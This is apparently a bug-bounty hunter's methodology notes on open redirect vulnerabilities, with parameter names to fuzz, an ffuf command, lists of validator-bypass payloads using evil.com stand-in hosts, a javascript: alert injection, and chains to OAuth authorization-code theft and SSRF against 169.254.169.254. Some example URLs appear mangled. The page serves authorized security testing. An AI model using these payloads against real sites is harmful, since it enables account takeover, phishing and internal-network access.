Open Redirect
An open redirect on its own is almost never worth reporting. Most programs rate it P4 or informational. The rare exceptions are programs with very generous scopes or ones that explicitly call it out as in-scope. The real value  -  and the only time I spend significant energy on them  -  is as a component in a chain.
Per my notes: don't report open redirects as standalone findings unless the program explicitly pays for them.

OAuth Chain (Most Valuable)
If the OAuth flow uses redirect_uri validation that can be bypassed via an open redirect on the allowed domain:
Normal: /oauth/authorize?client_id=app&redirect_uri=target.com/callback
Attack: /oauth/authorize?client_id=app&redirect_uri=target.com/redirect://attacker.com
If target.com/redirect is an open redirect and the OAuth server only validates that redirect_uri starts with target.com, the auth code lands at attacker.com in the URL fragment/query. See OAuth.
SSRF Filter Bypass
Server-side URL fetch that validates against a whitelist  -  if the validated URL redirects to an internal address, some implementations follow the redirect:
Allowed: target.com/*
Attack: target.com/redirect://169.254.169.254/metadata
Finding Open Redirects
Parameter Names to Fuzz
url, redirect, next, return, returnTo, return_url, redirect_url, goto,
dest, destination, continue, target, redir, r, u, link, navigate,
successUrl, failureUrl, cancelUrl, back, forward, to, from, path
# Fuzz common redirect parameters across a site
ffuf -w params.txt:PARAM -u "target.com/login://evil.com" \
  -mr "Location: evil.com" -H "User-Agent: Mozilla/5.0"
Post-Authentication Flows
Login, logout, and OAuth callback handlers are the most common locations. After login: ?next=/dashboard  -  change to ?next=evil.com. After logout: ?returnTo=evil.com.
JavaScript-Based Redirects
window.location = getParam('redirect');
document.location.href = decodeURIComponent(getParam('url'));
history.pushState(null, null, getParam('path'));
These don't produce HTTP 302 responses  -  they only fire client-side. Burp's passive scanner misses them. You need to look at JS source for URL parameter usage feeding into location, location.href, location.assign, location.replace.
Bypass Techniques
When an app tries to validate redirect URLs, these are the patterns worth testing:
# Protocol bypass
//evil.com
\/\/evil.com
https:evil.com
javascript://evil.com%0aalert(1)
 
# Domain confusion
evil.com@target.com           ← user@host  -  browser goes to target.com but some parsers go to evil.com
target.com.evil.com
target.com%2fevil.com%2f..
 
# Path traversal
target.com/../../evil.com
target.com/redirect/../../../evil.com
 
# Encoded characters
https://evil%2ecom
evil.com%23@target.com        ← fragment confusion
evil.com%3F@target.com        ← query confusion
 
# Null byte / truncation
target.com%00evil.com
Apps that validate "must start with target.com":
target.com.evil.com            ← passes prefix check
target.com@evil.com            ← passes prefix check in some parsers
target.com%2F@evil.com
Documenting for Chain Reports
When you find an open redirect that enables a chain, lead with the chain impact:

"Open redirect at /redirect?url= allows bypassing OAuth redirect_uri validation, resulting in authorization code exfiltration and account takeover."

The open redirect is one sentence of context. The account takeover is the finding.
Parser Differentials
The most reliable open redirect bypasses come from disagreements between the validator and the actual URL parser the app (or browser) uses. Different parsers have different opinions about what constitutes the "host" in a URL.
WHATWG (browser URL parsing) differs from RFC 3986 in several ways that matter for redirects:
Backslash as path separator  -  WHATWG treats \ as equivalent to / in the path and even in the authority section. RFC 3986 does not. Windows-hosted apps using .NET or IIS often parse URLs through layers that mix WHATWG-like behaviour with RFC 3986 validation:
target.com\evil.com       # WHATWG normalises to target.com/evil.com
                                    # but some validators treat target.com\ as the host
target.com\@evil.com      # can resolve to evil.com in some parsers
Authority parsing  -  WHATWG starts parsing the host at //, RFC 3986 authority starts after //. Some apps only look for target.com as a substring in the URL, not as the actual host:
evil.com://target.com   # passes substring check, redirects to evil.com
evil.com/path#target.com # fragment after target.com
RFC 3986 Edge Cases
These are the raw URL grammar edge cases that validators frequently miss:
@ in userinfo  -  RFC 3986 allows user:password@host in the authority. In a URL like target.com@evil.com, RFC 3986 says the host is evil.com and target.com is the username. Many string-based validators see target.com in the URL and consider it safe:
target.com@evil.com
https://user@evil.com:443/path
Protocol-relative URLs  -  //evil.com is a valid relative reference that inherits the current scheme. If the validator requires a scheme, this bypasses it:
//evil.com
\/\/evil.com      # backslash normalisation in some browsers
Fragment tricks  -  the # fragment is stripped by the browser before sending to the server. A server-side URL validator may see target.com/path#evil.com and consider it safe because the host is target.com. The browser ignores the fragment for the HTTP request but JavaScript still reads window.location.hash:
target.com/redirect://target.com/path#evil.com
Less useful for server-side redirect, but relevant for JavaScript-based redirects reading the URL.
Port confusion  -  target.com:evil.com/ is invalid per RFC 3986 (port must be numeric), but some parsers fail open and treat everything after : as a port, silently ignoring or truncating it.
Meta Refresh and JavaScript Redirects
Server-sent redirects (HTTP 302/301) are the obvious case. Two others that validators miss:
<meta http-equiv="refresh">  -  if the app writes user input into a meta refresh tag, the browser will follow the redirect after the specified delay:
<!-- Attacker-controlled 'url' parameter written into meta tag -->
<meta http-equiv="refresh" content="0; url=evil.com">
These don't produce a Location header and passive scanners miss them. Grep page source for http-equiv wherever user input is reflected.
JavaScript redirects  -  already covered in the Finding section, but worth noting the specific sinks that validators often overlook because they don't scan JavaScript:
window.location.replace(param)   // no browser back button
window.location.assign(param)    // standard redirect
document.location = param        // equivalent
location.href = param            // most common
For javascript: URIs specifically: if the app validates that the URL starts with https:// but passes the value into a JavaScript location.href assignment, the javascript: scheme bypasses schemes like the page javascript:void(0):
target.com/redirect:alert(document.domain)
# Only triggers if the value is used in JS context, not as a server-side 302
Chain Uses
Open redirects earn their keep in chains. Two patterns that reliably escalate severity:
Open Redirect to ATO via OAuth  -  full chain walkthrough: an open redirect on target.com allows bypassing the OAuth redirect_uri validation, which allows stealing authorization codes, which allows logging in as any victim who visits an attacker-crafted URL. Report the chain with "account takeover" as the headline. See OAuth for the redirect_uri section.
Open Redirect to token leak via Referer  -  if the redirect target has third-party resources (Google Analytics, ad scripts, fonts) and the redirect URL contains a sensitive token in the query string (e.g. a password reset token or OAuth state), that token appears in the Referer header of every third-party request. See Password Reset for this pattern applied to reset tokens.
Checklist

 Identify all redirect/return/next parameters in the app
 Test login, logout, and OAuth callback handlers
 Check post-registration flows (where does it send you after signup?)
 Test bypass patterns: protocol, domain confusion, encoding, and the @ userinfo trick
 Test WHATWG vs RFC 3986 differentials: backslash, protocol-relative //, and port confusion
 Search JS source for location =, location.href =, location.replace(, location.assign(
 Grep page source for http-equiv="refresh" wherever user input may appear
 For any open redirect found: immediately assess OAuth chain viability
 For any open redirect found: test SSRF chain if server-side fetching exists
 Test javascript: URI in parameters that feed into JavaScript location assignments
